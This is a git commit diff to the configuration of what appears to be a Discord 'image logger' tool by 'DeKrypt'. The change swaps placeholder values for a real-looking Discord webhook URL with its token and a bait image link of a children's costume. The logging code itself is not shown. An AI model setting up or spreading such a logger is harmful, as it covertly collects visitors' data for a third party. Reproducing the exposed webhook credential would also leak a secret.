aa47e317a6d3f6f969df6b83563ef7277c7c93bc
githubcuhuseyin <165399178+githubcuhuseyin@users.noreply.github.com>
2024-03-29 17:30:58 +0300

    Update main.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1150498515672387664/YpkrLreJfcvJgnEXuw62ymqX0Or-QjKYmXXLXvZ3N0mKNZi6D0ALihJJK6kuDLsTGLmt",
+    "image": "https://cdn.vegaoo.nl/images/rep_art/gra/335/2/335253/rood-power-rangers-kostuum-voor-kinderen.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
